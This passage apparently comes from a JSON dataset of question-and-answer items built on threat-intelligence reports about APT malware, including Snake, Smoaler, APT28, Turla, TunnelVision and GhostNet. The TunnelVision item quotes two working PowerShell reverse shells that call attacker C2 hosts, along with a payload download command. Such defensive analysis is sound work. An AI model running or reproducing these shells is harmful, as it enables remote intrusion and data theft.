\\\\.\\Hd1\n14/02/2014 02:22 PM\n1 File(s)\n0 Dir(s)\n7 Test.txt\n7 bytes\n0 bytes free\nHowever, as soon as IofCallDriver() hook is removed, the same 'dir' command will fail, as with no hook the rootkit cannot decrypt the scrambled volume:\nC:\\>dir \\\\.\\Hd1\\\\\nIncorrect function.\nThe second volume \\\\.\\Hd2 is not mapped to a file, so when a computer is switched off, its contents is lost. Thus, it could be used as a temporary or a cache storage. The data stored in \\\\.\\Hd2 is encrypted the same way the first volume's data.\nBoth volumes appear to be set up as FAT volumes.\nAn attempt to read the data from these volumes with the code below:\nThis will produce the following results:\nFor \\\\.\\Hd1:\nFor \\\\.\\Hd2:\nThe ability to keep its data on TrueCrypt-like volumes provides Snake with a powerful ability to exchange data with the usermode DLL, as these volumes are accessible both from usermode and kernel mode.\nStatic analysis of the code reveals that the Snake driver uses virtual volumes to store its data and additional files on it.\nFor example, it stores its message queue in a file called:\n\\.\\\\Hd1\\queue\nThe message queue indicates an asynchronous communication model between kernel mode driver and a usermode DLL, e.g. to pass commands, configuration parameters, binary images of additional Snake components.\nOther files that may also be found on the virtual volume are: klog, conlog, dump, rkng_inst.exe, where rkng_inst.exe could be the name of the original dropper, and other log files could potentially contain executed command outputs, intercepted keystrokes, and other output logs.\n\nWhat is the role of the virtual file volumes in the Snake malware's architecture, and how does the malware utilize these volumes for its operations?",
    "output": "The virtual file volumes in the Snake malware's architecture serve as encrypted storage for its files and configuration data. The first volume, \\\\.\\Hd1, is used for persistent storage and is mapped to a file (hotfix.dat), while the second volume, \\\\.\\Hd2, acts as temporary or cache storage and is not mapped to a file, losing its contents when the computer is switched off. Both volumes use FAT file systems and are encrypted using the CAST-128 algorithm. The malware utilizes these volumes to store various files such as a message queue (\\.\\\\Hd1\\\\queue) for asynchronous communication between the kernel mode driver and usermode DLL, log files (klog, conlog, dump), and potentially the original dropper (rkng_inst.exe). This setup allows Snake to securely manage its data and facilitate communication between its components.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nBig Headline: How Smoaler arrives\nThe Smoaler samples seen by SophosLabs were all packaged into files with the extensions .DOC or .DOCX. These extensions usually denote files specific to Microsoft Word that were created by Microsoft Word.\nDespite the extensions, however, all the files were actually in Rich Text Format (RTF), a text-based file format for representing documents.\nWe assume that the attackers chose RTF because its text structure makes it easier to manipulate to create a working exploit for the CVE-2012-0158 vulnerability.\nAs with PlugX, the Smoaler files arrived with Tibetan-themed subject lines:\nIf you open an infected document on an unpatched, unprotected computer, the shellcode in the document will activate and run.\nAfter infecting your computer, the shellcode loads a new copy of Word to display a decoy document that is hidden inside the malicious file.\nYou will notice only notice a brief flicker when the old instance of Word closes and the new one with the decoy opens.\nThe decoy documents are all unexceptional, uninfected documents with content that matches the filenames given to the malicious RTFs. (See Fig (<>)2.)\nIn preparing the decoy for display, the malware overwrites the infected RTF file with the contents of the decoy (which is in DOC format), thus removing one useful piece of evidence that might otherwise help pinpoint the source of infection.\nBig Headline: The shellcode\nThe executable code that kicks off infection is the same as was used in PlugX, being byte-for byte identical (see Fig 3) to the shellcode from [(<>)A].\nThis shellcode is unusual for its use of LZNT1 compression for the embedded executable payload. This technique has not been observed in any other APT (Advanced Persistent Threat) attacks.\nThe shellcode decompresses an embedded PE file, writes it into the %TEMP% folder with the name DW20.DLL (this mimics the filename used by the Dr. Watson utility on Windows that pops up when a program crashes), and runs it.\nBig Headline: First-stage dropper\nThe first-stage payload created by the shellcode contains another program file embedded as data.\nIt locates this in its own executable file, drops it to disk (which is where the name dropper comes from for this sort of malware component), and runs it.\nThere are two main sorts of dropper, detected by Sophos as Troj/Plugx-I and Troj/Plugx-K. (See Fig (<>)4.) The names reflect the similarity, thus far, to earlier PlugX malware.\nBut what happens next is quite different from a PlugX attack, which is why this malware has been given the general name Smoaler, rather than PlugX.\nBig Headline: The intermediate infector\nThe temporary file dropped by DW20.DLL contains a compressed DLL (dynamic link library: a special sort of program file) stored in its resources. This compressed program is unpacked using code built on the stack.\nThis component decodes the Command-and-Control (C&C) server names that the final malware will use, and saves them to the registry entry HKCU\\Software\\ Microsoft\\Windows Media\\XC. (See Fig (<>)5.)\nC&C servers are the computers to which infected computers, often called bots or zombies, connect in order to fetch instructions on what to do next. Putting the C&C server names in the registry, rather than in the zombie executable itself, means that if the user becomes suspicious and submits the malware file to a security vendor, the locations of the C&C servers will not be revealed.\nThe data in the registry entry is obscured by flipping the least significant bit of the non-zero bytes (i.e. XORing them with 0x01). This provides a light disguise against an inquisitive user.\nAfter storing the C&C names in the registry, the intermediate infector loads the dropped DLL using the LoadLibrary() Windows API call.\nThe intermediate infector is deleted from the system after execution.\nBig Headline: Main malware component\nThe DLL dropped by the intermediate infector is the principal component of Smoaler.\nThe DLLs created during infection are variable in size, and huge, ranging from 20 MBytes to 50 MBytes.\nThis is not because they are complex and packed with functionality: the useful content of Smoaler is less than 40 KBytes. The bulk of each DLL consists of a number (two to six) binary resources of 5 MBytes to 10 MBytes each. These resources are filled with zero bytes, entirely for the purpose of bulking up the file.\nWe assume that the purpose of deliberately bloating the main DLL is to disguise its original source, since even a suspicious user might not connect a multi-megabyte DLL with the original infectious RTF of a few hundred kilobytes. (The original RTF is also replaced with the decoy DOC file after infection, further diverting attention from the origin of the malware.)\nWhen the DLL first runs, it installs itself permanently into two places on the victim's computer:\n\u2022 C:\\Documents and Settings\\All Users\\Application Data\\Microsoft\\ Windows\\Burn\\%COMPUTERNAME%.dll\n(%COMPUTERNAME% is generated by querying the name of the computer.)\n\u2022 C:\\Documents and Settings\\All Users\\Application Data\\Microsoft\\ Windows\\LiveUpdata_Mem\\%RANDOM%.dll\n(The %RANDOM% part of the name is variable, e.g. B6go3s_One.dll or 7n5HjV.dll.)\nTwo or three copies of the DLL are dropped. They typically differ in size, because the zero-byte resource padding may vary in each file.\nThe DLL is added as a registry value called %COMPUTERNAME% in the registry key HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\run. This provides what is known as persistence, meaning that the malware is automatically re-loaded every time the victim reboots or logs on. (See Fig (<>)6.)\nNote that Smoaler is launched using the Windows utility rundll32.exe, because DLLs cannot execute on their own. They require a host program inside which to run.\nWhen connecting to its C&C servers, Smoaler injects itself into the process IEXPLORE.EXE. This is a common trick used by malware to make its traffic appear to originate from a browser, thus arousing much less suspicion.\nWhile running, however, Smoaler keeps a lookout for processes called vsserv.exe, fsdfwd.exe, AvastSvc.exe, uiWatchDog.exe, and avp.exe. It avoids injecting itself into Internet Explorer if any of them are active.\nThese processes belong to various security products, so this is a malware precaution often jocularly called anti-anti-virus, intended to avoid suspicious activity that might attract the attention of security software.\nAfter installing itself, Smoaler attempts to connect to its C&C servers. The domain names it uses are already known from earlier Tibet-related malware attacks: dtl.dnsd.me, dtl.eauto.com and dtl6.moo.com.\nBig Headline: What happens next?\nUnfortunately, we can't say precisely how an infected computer will behave if Smoaler gets this far.\nThat is because the content that the primary Smoaler DLL fetches from its C&C servers is whatever malware the attackers choose to serve up next.\nWorse still, the programs downloaded by Smoaler are not in regular EXE or DLL format.\nFirstly, the downloads are encrypted; secondly, their headers are stripped off so that, even decrypted, they are not immediately obvious as programs; thirdly, they are loaded directly into, and run directly from, memory, rather then being written to disk and launched via the Windows API.\nThat means that if you kill off the Smoaler process and delete its primary executable, as you will almost certainly want to do if you find out that you are infected, you may no longer have a complete copy of the malware to submit for analysis.\nIn this way, the Smoaler authors avoid showing all the cards in their hand at once, in the hope of staying one step ahead.\nHowever, this multi-stage approach also has a significant disadvantage for cybercriminals: there are now multiple points in the attack at which you can spot an anomaly, intervene, and win.\n\nHow does the shellcode used in Smoaler differ from typical shellcode used in other APT attacks, and what is the significance of this difference?",
    "output": "The shellcode used in Smoaler is unusual for its use of LZNT1 compression for the embedded executable payload. This technique has not been observed in any other APT attacks. The significance of this difference is that it adds a layer of complexity and uniqueness to the attack, making it harder for security analysts to detect and analyze the malware.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: A post-mortem analysis of Trojan.MAC.APT28 - XAgent\nFor the past decade, Windows users have been the main targets of consumer, for-profit cybercrime. Even now, malware on platforms such as Mac OS X and Linux is extremely scarce compared with the Windows threat landscape.\nEnter the upper tiers of malware creation: advanced persistent threats. These extremely complex, highly customized files are after targets, not platforms. Attacks such as those persistently carried out by APT28 target multiple individuals in multiple organizations who run a wide range of hardware and software configurations.\nSince the group's emergence in 2007, Bitdefender has become familiar with the backdoors used to compromise Windows and Linux targets, such as Coreshell, Jhuhugit and Azzy for the former OS or Fysbis for the latter. This year we have been able to finally isolate the Mac OS X counterpart - the XAgent modular backdoor. This whitepaper describes our journey in dissecting the backdoor and documenting it piece by piece.\n\nBased on the above text, answer a question. How does the focus of advanced persistent threats (APTs), such as those carried out by APT28, differ from traditional consumer-level cybercrime, particularly in terms of target selection and platform diversity?",
    "output": "Advanced persistent threats (APTs), such as those conducted by APT28, differ significantly from traditional consumer-level cybercrime in several ways. Traditional cybercrime primarily targets Windows users due to the platform's widespread use, aiming for profit through mass exploitation. In contrast, APTs are highly sophisticated and tailored to specific targets rather than platforms. Groups like APT28 focus on compromising multiple individuals within various organizations, regardless of the hardware or software they use. This approach requires the development of complex, customized malware capable of infecting a diverse range of systems, including Windows, Linux, and Mac OS X. For example, while APT28 has historically used backdoors like Coreshell, Jhuhugit, and Azzy for Windows, and Fysbis for Linux, they have recently expanded their arsenal to include the XAgent modular backdoor for Mac OS X, demonstrating their adaptability and the broad scope of their operations.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "The 'Penquin' Turla\nRecently, an interesting malicious sample was uploaded to a multi-scanner service. This immediately triggered our interest because it appears to represent a previously unknown piece of a larger puzzle. That puzzle is \"Turla\", one of the most complex APTs in the world.\nWe have written previously about the Turla APT with posts about their (<http://securelist.com/analysis/publications/65545/the-epic-turla-operation/>)Epic Turla operations  and (<http://securelist.com/blog/virus-watch/58551/agent-btz-a-source-of-inspiration/>)Agent.btz inspiration . So far, every single Turla sample we've encountered was designed for the Microsoft Windows family, 32 and 64 bit operating systems. The newly discovered Turla sample is unusual in the fact that it's the first Turla sample targeting the Linux operating system that we have discovered.\nThis newly found Turla component supports Linux for broader system support at victim sites. The attack tool takes us further into the set alongside the (<http://www.baesystems.com/what-we-do-rai/the-snake-campaign>)Snake rootkit and components first associated with this actor a couple years ago. We suspect that this component was running for years at a victim site, but do not have concrete data to support that statement just yet.\nThe Linux Turla module is a C/C++ executable statically linked against multiple libraries, greatly increasing its file size. It was stripped of symbol information, more likely intended to increase analysis effort than to decrease file size. Its functionality includes hidden network communications, arbitrary remote command execution, and remote management. Much of its code is based on public sources.\nGeneral executable characteristics:\nELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, for GNU/Linux 2.2.5, stripped\nStatically linked libraries:\nglibc2.3.2 - the GNU C library\nopenssl v0.9.6 - an older OpenSSL library\nlibpcap - tcpdump's network capture library\nHardcoded C&C, known Turla activity: news-bbc.podzone[.]org The domain has the following pDNS IP: 80.248.65.183\n80.248.65.183 aut-num: AS30982\nNote: the C&C domain is currently sinkholed by Kaspersky Lab.\nQuestion: Why did the Turla APT group develop a Linux-targeting malware component, and how does this expand their capabilities?",
    "output": "Answer: The Turla APT group developed a Linux-targeting malware component to broaden their system support at victim sites. Traditionally, Turla samples were designed exclusively for the Microsoft Windows family, both 32-bit and 64-bit operating systems. By creating a Linux-targeting component, Turla can now infiltrate and control systems running the Linux operating system, which are commonly used in various environments including servers and critical infrastructure. This expansion allows Turla to execute commands remotely, manage infected systems, and communicate covertly over networks, thereby enhancing their overall attack surface and capabilities.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How might the Darkhotel APT group utilize Adversary-in-the-Middle: DHCP Spoofing to enhance their malicious activities, particularly in regards to stealing sensitive information from hotel networks?",
    "output": "Adversary-in-the-Middle: DHCP Spoofing is a technique where an attacker intercepts and alters network traffic by spoofing Dynamic Host Configuration Protocol (DHCP) traffic and acting as a malicious DHCP server on the victim network. In the context of the Darkhotel APT group, this technique could be used to redirect network traffic to adversary-owned systems, allowing them to collect network communications, including passed credentials, especially those sent over insecure, unencrypted protocols. This could enable the group to steal sensitive information, such as login credentials, from hotel networks. Furthermore, by achieving the adversary-in-the-middle position, the group may also be able to manipulate transmitted data, inject malware, or perform other malicious activities. Given the Darkhotel group's focus on targeting hotel networks and stealing sensitive information, Adversary-in-the-Middle: DHCP Spoofing could be a valuable addition to their toolkit.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the Poison Ivy Remote Access Tool (RAT) achieve persistence on a compromised system, allowing attackers to maintain their foothold even after system restarts or credential changes?",
    "output": "Persistence is a critical aspect of an Advanced Persistent Threat (APT) as it enables attackers to maintain their access to compromised systems over time. In the case of Poison Ivy, persistence is achieved through the use of a watchdog thread that is injected into the explorer.exe process. This thread automatically restarts the Poison Ivy server process if it is unexpectedly terminated by the target's operating system. Additionally, Poison Ivy's ability to inject code into legitimate processes and use a custom network protocol over TCP allows it to maintain its foothold on the system even after system restarts or credential changes. Furthermore, the 'persistence' option in Poison Ivy's configuration allows attackers to specify whether the RAT should maintain its connection to the compromised system even after a reboot. By leveraging these techniques, attackers using Poison Ivy can ensure that their access to the compromised system persists over time, allowing them to continue stealing sensitive data and intellectual property.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: VMware Horizon Exploitation\nThe exploitation of Log4j in VMware Horizon is characterized by a malicious process spawned from the Tomcat service of the VMware product ( C:\\Program Files\\VMware\\VMware View\\Server\\bin\\ws_TomcatService.exe ).\nTunnelVision attackers have been actively exploiting the vulnerability to run malicious PowerShell commands, deploy backdoors, create backdoor users, harvest credentials and perform lateral movement.\nTypically, the threat actor initially exploits the Log4j vulnerability to run PowerShell commands directly, and then runs further commands by means of PS reverse shells, executed via the Tomcat process.\nBig Headline: PowerShell Commands\nTunnelVision operators exploited the Log4j vulnerability in VMware Horizon to run PowerShell commands, sending outputs back utilizing a webhook. In this example, the threat actor attempted to download (<https://ngrok.com/>)ngrok to a compromised VMware Horizon server:\ntry{\n(New-Object\nSystem.Net.WebClient).DownloadFile(\"hxxp://transfer.sh/uSeOFn/ngrok.exe\",\"C:\\\\Users\\Pu\nThroughout the activity the usage of multiple legitimate services was observed. Given an environment is compromised by TunnelVision, it might be helpful to look for outbound connections to any of those legitimate public services:\ntransfer.sh\npastebin.com\nwebhook.site\nufile.io\nraw.githubusercontent.com\nBig Headline: Reverse Shell #1\n$c = \"\" $p = \"\" $r = \"\" $u = \"hxxps://www.microsoft-updateserver.cf/gadfTs55sghsSSS\" $wc = New-Object System.Net.WebClient $li = (Get-NetIPAddress -AddressFamily IPv4).IPAddress[0]; $c = \"whoami\" $c = 'Write-Host \" \";'+$c $r = &(gcm *ke-e*) $c | Out-String > \"c:\\programdata\\$env:COMPUTERNAME-$li\" $ur = $wc.UploadFile(\"$u/phppost.php\" , \"c:\\programdata\\$env:COMPUTERNAME-$li\") while($true) { $c = $wc.DownloadString(\"$u/$env:COMPUTERNAME-$li/123.txt\") $c = 'Write-Host \" \";'+$c if($c -ne $p) { $r = &(gcm *ke-e*) $c | Out-String > \"c:\\programdata\\$env:COMPUTERNAME-$li\" $p = $c $ur = $wc.UploadFile(\"$u/phppost.php\" , \"c:\\programdata\\$env:COMPUTERNAME-$li\") } sleep 3 }\nReverse Shell #1 was used in the past by TunnelVision operators (7feb4d36a33f43d7a1bb254e425ccd458d3ea921), utilizing a different C2 server: \"hxxp://google.onedriver-srv.ml/gadfTs55sghsSSS\". This C2 was referenced in several  analyzing TunnelVision activities.\nThroughout the activity the threat actor leveraged another domain, service-management[.]tk , used to host malicious payloads. According to VirusTotal, this domain was also used to host a zip file (d28e07d2722f771bd31c9ff90b9c64d4a188435a) containing a custom backdoor (624278ed3019a42131a3a3f6e0e2aac8d8c8b438).\nThe backdoor drops an additional executable file (e76e9237c49e7598f2b3f94a2b52b01002f8e862) to %ProgramData%\\Installed Packages\\InteropServices.exe and registers it as a service named \"InteropServices\".\nThe dropped executable contains an obfuscated version of the reverse shell as described above, beaconing to the same C2 server ( www[.]microsoft-updateserver[.]cf ). Although it is not encrypted, it is deobfuscated and executed in a somewhat similar manner to how PowerLess, another  used by the group, executes its PowerShell payload.\nBig Headline: Reverse Shell #2\n$hst = \"51.89.135.142\";\n$prt = 443;\nfunction watcher() {; $limit = (Get - Random - Minimum 3 - Maximum 7); $stopWatch = New - Object - TypeName System.Diagnostics.Stopwatch; $timeSpan = New - TimeSpan - Seconds $limit; $stopWatch.Start(); while ((($stopWatch.Elapsed).TotalSeconds - lt $timeSpan.TotalSeconds) ) {}; $stopWatch.Stop(); }; watcher; $arr = New - Object int[] 500; for ($i = 0; $i - lt 99; $i++) {; $arr[$i] = (Get - Random - Minimum 1 - Maximum 25); }; if ($arr[0] - gt 0) {; $valksdhfg = New - Object System.Net.Sockets.TCPClient($hst, $prt); $banljsdfn = $valksdhfg.GetStream(); [byte[]]$bytes = 0..65535|% { 0 }; while (($i = $banljsdfn.Read($bytes, 0, $bytes.Length)) - ne 0) {; $lkjnsdffaa = (New - Object - TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i); $nsdfgsahjxx = (&(gcm('*ke-exp*')) $lkjnsdffaa 2 > &1 | Out - String ); $nsdfgsahjxx2 = $nsdfgsahjxx + (pwd).Path + \"> \"; $sendbyte = ([text.encoding]::ASCII).GetBytes($nsdfgsahjxx2); $banljsdfn.Write($sendbyte, 0, $sendbyte.Length); $banljsdfn.Flush(); watcher }; $valksdhfg.Close(); };\nMost of the \"online\" activities we observed were performed from this PowerShell backdoor. It seems to be a modified variant of a (<https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1>)publicly available PowerShell one-liner.\nAmong those activities were:\nExecution of recon commands.\nCreation of a backdoor user and adding it to the administrators group.\nCredential harvesting using Procdump, SAM hive dumps and comsvcs MiniDump.\nDownload and execution of tunneling tools, including Plink and Ngrok, used to tunnel RDP traffic.\nExecution of a reverse shell utilizing VMware Horizon NodeJS component[,].\nInternal subnet RDP scan using a (<https://github.com/InfosecMatter/Minimalistic-offensive-security-tools/blob/master/port-scan-tcp.ps1>)publicly available port scan script.\nThroughout the activity, the threat actor utilized a github repository \"VmWareHorizon\" of an account owned by the threat actor, using the name \"protections20\".\nBig Headline: Attribution\nTunnelVision activities have been discussed previously and are tracked by other vendors under a variety of names, such as Phosphorus (Microsoft) and, confusingly, either Charming Kitten or Nemesis Kitten (CrowdStrike).\nThis confusion arises since activity that Microsoft recognizes as a single group, \"Phosphorous\", overlaps with activity that CrowdStrike distinguishes as belonging to two different actors, Charming Kitten and Nemesis Kitten.\nWe track this cluster separately under the name \"TunnelVision\". This does not imply we believe they are necessarily unrelated, only that there is at present insufficient data to treat them as identical to any of the aforementioned attributions.\nQuestion: What techniques did TunnelVision use to establish reverse shells, and how did they leverage these shells for further activities?",
    "output": "Answer: TunnelVision used multiple reverse shell techniques to maintain persistence and control over compromised systems. One reverse shell script utilized a C2 server hosted at 'hxxps://www.microsoft-updateserver.cf/gadfTs55sghsSSS'. This script continuously checked for new commands from the C2 server and executed them, uploading the results back to the server. Another reverse shell was a modified variant of a publicly available PowerShell one-liner, which connected to a hardcoded IP address and port (51.89.135.142:443). Through these reverse shells, TunnelVision performed various activities such as executing recon commands, creating backdoor users, harvesting credentials, downloading and executing tunneling tools like Plink and Ngrok, and scanning internal subnets for RDP services.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: CONCLUSION\nSince releasing our 2014 report, we continue to assess that APT28 is sponsored by the Russian Government. We further assess that APT28 is the group responsible for the network compromises of WADA and the DNC and other entities related to the 2016 U.S. presidential election cycle. These breaches involved the theft of internal data - mostly emails \u2013 that was later strategically leaked through multiple forums and propagated in a calculated manner almost certainly intended to advance particular Russian Government aims. In a report released on January 7 2017, the U.S. Directorate of National Intelligence described this activity as an \"influence campaign.\"\nThis influence campaign - a combination of network compromises and subsequent data leaks - aligns closely with the Russian military's publicly stated intentions and capabilities. Influence operations, also frequently called \"information operations,\" have a long history of inclusion in Russian strategic doctrine, and have been intentionally developed, deployed, and modernized with the advent of the internet. The recent activity in the U.S. is but one of many instances of Russian Government influence operations conducted in support of strategic political objectives, and it will not be the last. As the 2017 elections in Europe approach - most notably in Germany, France, and the Netherlands - we are already seeing the makings of similarly concerted efforts.\nMedium Headline: APT28's Tools, Tactics, and Operational Changes\nIn our 2014 report, we identified APT28 as a suspected Russian government-sponsored espionage actor. We came to this conclusion in part based on forensic details left in the malware that APT28 had employed since at least 2007. We have provided an updated version of those conclusions, a layout of the tactics that they generally employ, as well as observations of apparent tactical shifts. For full details, please reference our 2014 report, APT28: A Window into Russia's Cyber Espionage Operations?\nAPT28 employs a suite of malware with features indicative of the group's plans for continued operations, as well as the group's access to resources and skilled developers.\nSmall Headline: Key characteristics of APT28's toolset include:\n\u2022 A flexible, modular framework that has allowed APT28 to consistently evolve its toolset since at least 2007.\n\u2022 Use of a formal coding environment in which to develop tools, allowing the group to create and deploy custom modules within its backdoors.\n\u2022 Incorporation of counter-analysis capabilities including runtime checks to identify an analysis environment, obfuscated strings unpacked at runtime, and the inclusion of unused machine instructions to slow analysis.\n\u2022 Code compiled during the normal working day in the Moscow time zone and within a Russian language build environment.\nSmall Headline: APT28'S OPERATIONAL CHANGES SINCE 2014\nAPT28 continues to evolve its toolkit and refine its tactics in what is almost certainly an effort to protect its operational effectiveness in the face of heightened public exposure and scrutiny. In addition to the continued evolution of the group's first stage tools, we have also noted APT28:\n\u2022 Leveraging zero-day vulnerabilities in Adobe Flash Player, Java, and Windows, including CVE-2015-1701, CVE-2015-2424, CVE-2015-2590, CVE-2015-3043, CVE-2015-5119, and CVE-2015-7645.\n\u2022 Using a profiling script to deploy zero-days and other tools more selectively, decreasing the chance that researchers and others will gain access to the group's tools.\n\u2022 Increasing reliance on public code depositories, such as Carberp, PowerShell Empire, P.A.S. webshell, Metasploit modules, and others in a likely effort to accelerate their development cycle and provide plausible deniability.\n\u2022 Obtaining credentials through fabricated Google App authorization and Oauth access requests that allow the group to bypass two-factor authentication and other security measures.\n\u2022 Moving laterally through a network relying only on legitimate tools that already exist within the victims' systems, at times forgoing their traditional toolset for the duration of the compromise.\nThese changes are not only indicative of APT28's skills, resourcefulness, and desire to maintain operational effectiveness, but also highlight the longevity of the group's mission and its intent to continue its activities for the foreseeable future.\nSmall Headline: APT28 TACTICS\nWe have observed APT28 rely on four key tactics when attempting to compromise intended targets. These include sending spear-phishing emails that either deliver exploit documents that deploy malware onto a user's systems, or contain a malicious URL designed to harvest the recipients' email credentials and provide access to the their accounts. APT28 has also compromised and placed malware on legitimate websites intending to infect site visitors, and has gained access to organizations by compromising their web-facing servers\nTACTIC\nBig Headline: TACTIC\nACCESS THROUGH INTERNET-FACING SERVERS\nNetwork reconnaissance to find vulnerable software.\nExploitation of previously known vulnerabilities present on unpatched systems.\nLeverage initial compromise to access other systems and move deeper into the victim network.\nAPT28 IS IN YOUR NETWORK.\nTo download this or other FireEye iSIGHT Intelligence reports, visit: www.fireeye.com/reports.html\nFireEye, Inc.\n1440 McCarthy Blvd. Milpitas, CA 95035\n408.321.6300 / 877.FIREEYE (347.3393) / info@FireEye.com\nwww.FireEye.com\n\u00a9 2016 FireEye, Inc. All rights reserved. FireEye is a registered trademark of FireEye, Inc. All other brands, products, or service names are or may be trademarks or service marks of their respective owners. GRAF-60.\nRead the text above and answer this question: How has APT28 adapted its tactics to leverage legitimate tools and bypass security measures, and what specific methods have they employed to achieve this?",
    "output": "APT28 has adapted its tactics to leverage legitimate tools and bypass security measures by using fabricated Google App authorization and OAuth access requests to obtain credentials, which allows them to bypass two-factor authentication and other security measures. They also move laterally through a network using only legitimate tools that already exist within the victims' systems, sometimes forgoing their traditional toolset for the duration of the compromise. These methods enable APT28 to operate stealthily and effectively within compromised networks, making it harder for defenders to detect and mitigate their activities.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Foreword\nCyber espionage is an issue whose time has come. In this second report from the Information Warfare Monitor, we lay out the findings of a 10-month investigation of alleged Chinese cyber spying against Tibetan institutions.\nThe investigation, consisting of fieldwork, technical scouting, and laboratory analysis, discovered a lot more.\nThe investigation ultimately uncovered a network of over 1,295 infected hosts in 103 countries. Up to 30% of the infected hosts are considered high-value targets and include computers located at ministries of foreign affairs, embassies, international organizations, news media, and NGOs. The Tibetan computer systems we manually investigated, and from which our investigations began, were conclusively compromised by multiple infections that gave attackers unprecedented access to potentially sensitive information.\nBut the study clearly raises more questions than it answers.\nFrom the evidence at hand, it is not clear whether the attacker(s) really knew what they had penetrated, or if the information was ever exploited for commercial or intelligence value.\nSome may conclude that what we lay out here points definitively to China as the culprit.  Certainly Chinese cyber-espionage is a major global concern. Chinese authorities have made it clear that they consider cyberspace a strategic domain, one which helps redress the military imbalance between China and the rest of the world (particularly the United States). They have correctly identified cyberspace as the strategic fulcrum upon which U.S. military and economic dominance depends.\nBut attributing all Chinese malware to deliberate or targeted intelligence gathering operations by the Chinese state is wrong and misleading. Numbers can tell a different story. China is presently the world's largest Internet population. The sheer number of young digital natives online can more than account for the increase in Chinese malware. With more creative people using computers, it's expected that China (and Chinese individuals) will account for a larger proportion of cybercrime.\nLikewise, the threshold for engaging in cyber espionage is falling. Cybercrime kits are now available online, and their use is clearly on the rise, in some cases by organized crime and other private actors. Socially engineered malware is the most common and potent; it introduces Trojans onto a system, and then exploits social contacts and files to propagate infections further.\nFurthermore, the Internet was never built with security in mind. As institutions ranging from governments through to businesses and individuals depend on 24-hour Internet connectivity, the opportunities for exploiting these systems increases.\nThis report serves as a wake-up call. At the very least, a large percentage of high-value targets compromised by this network demonstrate the relative ease with which a technically unsophisticated approach can quickly be harnessed to create a very effective spynet\u2026These are major disruptive capabilities that the professional information security community, as well as policymakers, need to come to terms with rapidly.\nThese are major disruptive capabilities that the professional information security community, as well as policymakers, need to come to terms with rapidly.\nRon Deibert, Director, the Citizen Lab, Munk Centre for International Studies, University of Toronto.\nRafal Rohozinski, Principal and CEO,\nThe SecDev Group,\nOttawa, Canada.\nBig Headline: Acknowledgements\nThis investigation was prepared by a dedicated team of professionals.\nGreg Walton conducted and coordinated the primary field-based research in India, Tibetan Missions abroad, and Europe. Greg is a SecDev Group associate and editor of the Information Warfare Monitor website. He is currently a SecDev Fellow at the Citizen Lab. The Indian portion of the field work  benefited from the expertise of Dr. Shishir Nagaraja, Security Laboratory, Cambridge University. Dr. Nagaraga visited Dharamsala for a period of five days in September to assist on aspects of the technical data collection.1\nThe technical scouting and computer network interrogation was carried out by Nart Villenueve. Nart is the CTO of Psiphon Inc, and the Psiphon Fellow at the Citizen Lab. His investigations included the discovery and exploration of the GhostNet control servers. He led the data analysis research, which included log files gathered in the field, as well as data obtained through technical scouting of the  GhostNet control servers.\nThis report represents a collective effort. The drafting team consisted of the following individuals (listed in alphabetical order). Ronald Deibert (Citizen Lab), Arnav Manchanda (SecDev Group), Rafal Rohozinski (SecDev Group and Psiphon Inc.), Nart Villeneuve (Psiphon Fellow, Citizen Lab) and Greg Walton (SecDev Fellow, Citizen Lab). Layout and design was led by Jane Gowan (Psiphon Inc. and Citizen Lab). Belinda Bruce (Blurb Media) and James Tay (Citizen Lab), provided additional support to the team.\nCountless others also contributed to the research effort. This includes individuals in India and Tibet, who for security reasons we cannot name. We are also grateful to the Private Office of his Holiness the Dalai Lama, the Tibetan Government-in-Exile, the missions of Tibet in London, Brussels, and New York, and Drewla (a Tibetan NGO).\n1 Aspects of the research carried out by Dr. Nagaraga  focusing on socially engineered malware are published in a separate study. See, The snooping dragon: social-malware surveillance of the Tibetan movement, Shishir Nagaraja, Ross Anderson, Cambridge University Computer Laboratory Technical Report, Mar 29 2009\nSummary p. 5\nIntroduction p. 7\nRise of the cyber spies p. 7\nA focus on China p. 9\nOutline of Report p. 9\nMedium Headline: Part Two: Tracking Ghostnet p. 16\nPhase I: Field investigation p. 17\n\u2022 Targeted malware \u2013 previous research p. 17\n\u2022 Information Warfare Monitor field research p. 22\n\u2022 Office of His Holiness the Dalai Lama p. 22\n\u2022 Tibetan Government-in-Exile p. 27\n\u2022 Offices of Tibet p. 27\n\u2022 Drewla p. 27\nPhase 2: Identifying command and control servers p. 30\n\u2022 List of infected computers p. 32\n\u2022 Sending commands p. 34\n\u2022 Command results p. 37\n\u2022 Methods and capabilities p. 39\n\u2022 Analysis of list of infected computers p. 40\n\u2022 Methodology p. 40 \u2022\t Selected infections p. 42\n\u2022 Infection timeline p. 44\nMedium Headline: Figures\nFig. 1: A \"Social Engineering\" attack connects to GhostNet p. 19\nFig. 2: A \"Socially Engineered\" email sent to the International Tibet Support Network p. 20\nFig. 3: A Virus Total Screen Capture of a malware infected email attachment p. 21\nFig. 4: Field researchers discovered malware at five Tibetan locations p. 23\nFig. 5: Malware retrieving a sensitive document p. 26\nFig. 6: The OHHDL and Drewla were infected by the same malware p. 29\nFig. 7: The GhostNet control servers p. 31\nFig. 8: The GhostNet \"Server List\" interface p. 33\nFig. 9: The GhostNet \"Send Command\" interface p. 35\nFig. 10: The gh0st RAT interface p. 36\nFig. 11: The GhostNet \"List Command\" interface p. 38\nFig. 12: The geographic location of infected hosts p. 41\nFig. 13. GhostNet infection timeline p. 45\nQ: How did the GhostNet investigation reveal the extent of cyber espionage activities? What methods were employed to uncover the network of infected hosts, and how did the attackers gain access to potentially sensitive information?",
